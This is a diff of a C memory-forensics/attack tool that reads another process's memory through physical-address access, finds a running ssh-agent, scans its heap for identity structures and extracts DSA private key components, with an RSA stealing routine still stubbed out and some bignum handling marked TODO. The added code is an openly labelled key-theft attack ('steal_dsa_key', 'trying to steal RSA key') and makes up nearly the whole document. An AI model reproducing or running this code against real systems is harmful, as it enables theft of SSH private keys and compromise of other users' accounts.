@@ -21,6 +21,9 @@
 
 #define _LARGEFILE64_SOURCE
 
+// needed for memmem:
+#define _GNU_SOURCE
+
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
@@ -28,43 +31,21 @@
 #include <stdio.h>
 #include <errno.h>
 #include <string.h>
+#include <time.h>
+
+#include <openssl/rsa.h>
+#include <openssl/dsa.h>
 
 #include <physical.h>
 #include <linear.h>
+#include <endian_swap.h>
+
+#include "sshkey-structs.h"
 
 char pagedir[4096];
 addr_t stack_bottom = 0;
 
 #define NODE_OFFSET     0xffc0
-
-// dump a page in neat format
-void dump_page(uint32_t pn, char* page)
-{
-	uint32_t addr;
-	int i,j;
-	char c;
-	printf("dump page %x\n", pn);
-
-	addr = pn * 4096;
-	for(i = 0; i<4096; i+=16) {
-		printf("page 0x%05x, addr 0x%08x: ", pn, addr+i);
-		for(j = 0; j < 16; j++) {
-			printf("%02hhx ", (page+i)[j]);
-			if((j+1)%4 == 0 && j)
-				putchar(' ');
-		}
-		printf("  |  ");
-		for(j = 0; j < 16; j++) {
-			c = (page+i)[j];
-			if(c < 0x20)
-				c = '.';
-			if(c >= 0x7f)
-				c = '.';
-			putchar(c);
-		}
-		printf("\n");
-	}
-}
 
 // the following two functions, get_process_name and resolve_env are
 // using the stack bottom of the given process. i have found that
@@ -179,7 +160,7 @@ char* resolve_env(linear_handle h, char* envvar)
 			p--;
 		}
 		if(p == stack) {env_ok = 0; break;}
-		if(!found_eq) {env_ok = 0; break;}
+		if(!found_eq) {env_ok = 2; break;}
 		
 		// p   q
 		// |   |
@@ -198,33 +179,120 @@ char* resolve_env(linear_handle h, char* envvar)
 }
 
 
-// dump the full userspace hexadecimal to stdout
-void dump_userspace(linear_handle h)
+// fix a remote bignum to a local bignum
+BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 {
-	addr_t pn;
-	addr_t padr;
-	char* page;
-	page = malloc(4096);
+	addr_t p;
+	BIGNUM* b;
 
-	pn = 0;
+	printf("\t\t\t\tfix bignum @0x%08x: ", (uint32_t)rb);
+	p = (uint32_t)rb;
+	p &= 0xffffffff;
+	b = calloc(1, sizeof(BIGNUM));
 
-	while(pn < 0xc0000) {
-		if(linear_to_physical(h, pn*4096, &padr))
-			printf("UNMAPPED PAGE 0x%05x\n", (uint32_t)pn);
-		else {
-			printf("page 0x%05x maps to 0x%08x\n", (uint32_t)pn, (uint32_t)padr);
-			if(linear_read_page(h, pn, page))
-				printf("UNREADABLE PAGE\n");
-			else
-				dump_page((uint32_t)pn, page);
-		}
-		pn++;
+	if(   linear_read(lin, p   , &(b->d), 4)
+	   || linear_read(lin, p+4 , &(b->top), 4)
+	   || linear_read(lin, p+8 , &(b->dmax), 4)
+	   || linear_read(lin, p+12, &(b->neg), 4)
+	   || linear_read(lin, p+16, &(b->flags), 4) ) {
+		free(b);
+		printf("failed to read BIGNUM @0x%08llx\n", p);
+		return 0;
 	}
 
-	free(page);
+#ifdef __BIG_ENDIAN__
+	b->d = (BN_ULONG*) endian_swap32((uint32_t)b->d);
+	b->top = endian_swap32(b->top);
+	b->dmax = endian_swap32(b->dmax);
+	b->neg = endian_swap32(b->neg);
+	b->flags = endian_swap32(b->flags);
+#endif
+
+	// TODO: fix b->d
+
+	printf("recovered to 0x%08x\n", (uint32_t)b);
+	return b;
 }
 
+int steal_rsa_key(linear_handle lin, Key* key)
+{
+	// TODO
+	lin = 0;
+	key = 0;
+	return 0;
+}
+
+int steal_dsa_key(linear_handle lin, Key* key)
+{
+	addr_t p;
+
+	if(!key->dsa)
+		return 0;
+
+	p = (uint32_t)key->dsa;
+
+	key->dsa = calloc(1,sizeof(DSA));
+
+	if(   linear_read(lin, p   , &(key->dsa->pad), 4)
+	   || linear_read(lin, p+4 , &(key->dsa->version), 4)
+	   || linear_read(lin, p+8 , &(key->dsa->write_params), 4)
+	   || linear_read(lin, p+12, &(key->dsa->p), 4)
+	   || linear_read(lin, p+16, &(key->dsa->q), 4)
+	   || linear_read(lin, p+20, &(key->dsa->g), 4)
+	   || linear_read(lin, p+24, &(key->dsa->pub_key), 4)
+	   || linear_read(lin, p+28, &(key->dsa->priv_key), 4)
+	   || linear_read(lin, p+32, &(key->dsa->flags), 4) ) {
+		free(key->dsa);
+		key->dsa = NULL;
+		return 0;
+	}
+	// don't care for the rest
+	//  p+36  method_mont_p (?)
+	//  p+40  references (?)
+	//  p+44  ex_data (?)
+	//  p+48  meth (?)
+	//  p+52  engine (?)
+
+#ifdef __BIG_ENDIAN__
+	key->dsa->pad = endian_swap32(key->dsa->pad);
+	key->dsa->version = endian_swap32(key->dsa->version);
+	key->dsa->write_params = endian_swap32(key->dsa->write_params);
+	key->dsa->p = (BIGNUM*)endian_swap32((uint32_t) key->dsa->p);
+	key->dsa->q = (BIGNUM*)endian_swap32((uint32_t) key->dsa->q);
+	key->dsa->g = (BIGNUM*)endian_swap32((uint32_t) key->dsa->g);
+	key->dsa->pub_key = (BIGNUM*)endian_swap32((uint32_t) key->dsa->pub_key);
+	key->dsa->priv_key = (BIGNUM*)endian_swap32((uint32_t) key->dsa->priv_key);
+	key->dsa->flags = endian_swap32(key->dsa->flags);
+#endif
+
+	printf("\t\t\tDSA: pad %d, version %d, write_params %d, p@0x%08x, q@0x%08x, g@0x%08x, pub_key@0x%08x, priv_key@0x%08x\n",
+		key->dsa->pad, (uint32_t)key->dsa->version, key->dsa->write_params, (uint32_t)key->dsa->p,
+		(uint32_t)key->dsa->q, (uint32_t)key->dsa->g, (uint32_t)key->dsa->pub_key, (uint32_t)key->dsa->priv_key);
+
+	key->dsa->p = fix_bignum(lin, key->dsa->p);
+	key->dsa->q = fix_bignum(lin, key->dsa->q);
+	key->dsa->g = fix_bignum(lin, key->dsa->g);
+	key->dsa->pub_key = fix_bignum(lin, key->dsa->pub_key);
+	key->dsa->priv_key = fix_bignum(lin, key->dsa->priv_key);
+
+	if(key->dsa->p && key->dsa->q && key->dsa->g && key->dsa->pub_key && key->dsa->priv_key) {
+		printf("OK.\n");
+		return 1;
+	} else {
+		free(key->dsa);
+		key->dsa = NULL;
+		printf("\t\t\tfailed to recover bignums.\n");
+		return 0;
+	}
+}
+
+
+// show process name, check if ssh and if so, attack it.
 void check_ssh_agent(linear_handle lin) {
+#	define AGENT_START	0x08000
+#	define AGENT_MAXLEN	0x00800
+#	define REMOTE_TO_LOCAL(r,lbase)	((char*) (lbase + ((uint32_t)r) - (AGENT_START << 12)) )
+#	define LOCAL_TO_REMOTE(l,lbase)	((char*) (l - lbase + (AGENT_START << 12)) )
 	char* pname;
 
 	pname = get_process_name(lin);
@@ -236,39 +304,116 @@ void check_ssh_agent(linear_handle lin) {
 			home = resolve_env(lin, "HOME");
 			if(home) {
 				char identity_path[1024];
+				char* heap;	// actually this is a dump of the executable and heap
+						// but we don't care for the executable.
 				addr_t pn;
+
+				char* comment;	// location of the comment field
+				char* rcomment; // remote location of the comment field
+				char* identity; // location of struct identity (actually pointing somewhere into it)
+				addr_t ridentity;
+				addr_t rkey;	// remote location of the key
+				time_t t;	// local time
+				time_t death;	// when the key dies
+				Key key;	// the key we want
+				int n;
 
 				snprintf(identity_path, 1024, "%s/.ssh/", home);
 				free(home);
-				printf("\tidentity path would be \"%s\"\n", identity_path);
+				printf("\tidentity path would be \"%s\"\n\n", identity_path);
 				// now lets seek for this string. it will be located somewhere
 				// on the heap, right behind the executable.
 				// the executable is mapped somewhere after 0x08000000, so
 				// we will just start there. 0x08800000 should never be hit.
-				pn = 0x08000;
-				/* { // XXX TEST: dump the typical HEAP range
-					char page[4096];
-					addr_t padr;
-
-					while(pn < 0x08800) {
-						if(linear_to_physical(lin, pn*4096, &padr))
-							printf("UNMAPPED PAGE 0x%05x\n", (uint32_t)pn);
-						else {
-							printf("page 0x%05x maps to 0x%08x\n", (uint32_t)pn, (uint32_t)padr);
-							if(linear_read_page(lin, pn, page))
-								printf("UNREADABLE PAGE\n");
-							else
-								dump_page((uint32_t)pn, page);
-						}
-						pn++;
-					}
-				} */
 				// btw. we are searching this string because it will be the
-				// comment-field of the identity-struct of the ssh-agent
+				// comment-field of the identity-struct of the ssh-agent.
 				// for more info, please see ssh-agent.c of openssh
+				heap = calloc(AGENT_MAXLEN, 4096);
+				for(pn = 0; pn < AGENT_MAXLEN; pn++) {
+					linear_read_page(lin, AGENT_START + pn, heap + 4096 * pn);
+				}
 
-				// XXX INSERT MAGIC HERE
-				printf("\t" "\x1b[1;32m" "INSERT MAGIC HERE" "\x1b[0m" "\n");
+				// find each substring in the heap (for each loaded keypair)
+				comment = heap;
+				while((comment = memmem(comment + 1, AGENT_MAXLEN * 4096 - (comment+1 - heap), identity_path, strlen(identity_path)))) {
+									// do not search the tailing \0 !
+					rcomment = LOCAL_TO_REMOTE(comment, heap);
+					printf("\tfound \"%s\" at remote 0x%08x\n", comment, (uint32_t)rcomment);
+#ifdef __BIG_ENDIAN__
+					rcomment = (char*) endian_swap32((uint32_t)rcomment);
+#endif
+					identity = memmem(heap, AGENT_MAXLEN * 4096, &rcomment, 4);
+					if(!identity) {
+						printf("\tdid not find matching identity struct\n");
+						break;
+					}
+					//
+					// identity-struct struct found
+					//
+					identity -= 4; // now it points to 'Key* key' inside the identity-struct
+					ridentity = ((uint64_t)(uint32_t)LOCAL_TO_REMOTE(identity, heap)) & 0xffffffff;
+
+					// print time of death of this key:
+					t = time(NULL);
+					if(linear_read(lin, ridentity+8, &death, 4))
+						break;
+#ifdef __BIG_ENDIAN__
+					death = endian_swap32(death);
+#endif
+					if(death == 0)
+						printf("\t\tkey lives infinite.\n");
+					else
+						if(death < t)
+							printf("\t\tkey should be dead (timeout) for %d seconds.\n", (uint32_t)t - (uint32_t)death);
+						else
+							printf("\t\tkey will live for %u seconds\n", (uint32_t)death - (uint32_t)t);
+
+					rkey = 0;
+					// carefull: sizeof(rkey) is 8!
+					if(linear_read(lin, ridentity, &n, 4))
+						break;
+					rkey = n;
+#ifdef __BIG_ENDIAN__
+					rkey = ((uint64_t)endian_swap32((uint32_t)rkey));
+#endif
+					rkey &= 0xffffffff;
+					printf("\t\tkey is at remote 0x%08x.\n", (uint32_t)rkey);
+
+					if( linear_read(lin, rkey,    &key.type, 4)  ||
+					    linear_read(lin, rkey+4,  &key.flags, 4) ||
+					    linear_read(lin, rkey+8,  &key.rsa, 4)   ||
+					    linear_read(lin, rkey+12, &key.dsa, 4) )
+						break;
+#ifdef __BIG_ENDIAN__
+					key.type = endian_swap32(key.type);
+					key.flags = endian_swap32(key.flags);
+					key.rsa = (RSA*)endian_swap32((uint32_t)key.rsa);
+					key.dsa = (DSA*)endian_swap32((uint32_t)key.dsa);
+#endif
+					printf("\t\tKEY: type:%d flags:0x%x, RSA* 0x%08x, DSA* 0x%08x\n", key.type, key.flags, (uint32_t)key.rsa, (uint32_t)key.dsa);
+					if(key.rsa) {
+						printf("\t\t" "\x1b[1;31m" "trying to steal RSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.rsa);
+						if(!steal_rsa_key(lin, &key)) {
+							printf("\t\tfailed :(\n");
+							key.rsa = 0;
+						}
+					}
+					if(key.dsa) {
+						printf("\t\t" "\x1b[1;31m" "trying to steal DSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.dsa);
+						if(!steal_dsa_key(lin, &key)) {
+							printf("\t\tfailed :(\n");
+							key.dsa = 0;
+						}
+					}
+					// DSA is the same as struct dsa_st, defined in openssl/crypto/dsa/dsa.h
+					// RSA is the same as struct rsa_st, defined in openssl/crypto/rsa/rsa.h
+					// BIGNUM is the same as struct bignum_st, defined in openssl/crypto/bn/bn.h
+
+
+					// XXX INSERT MAGIC HERE
+					printf("\t" "\x1b[1;32m" "INSERT MAGIC HERE" "\x1b[0m" "\n");
+				}
+				free(heap);
 			}
 			printf("\x1b[1;31m" "end" "\x1b[0m" "\n");
 		}
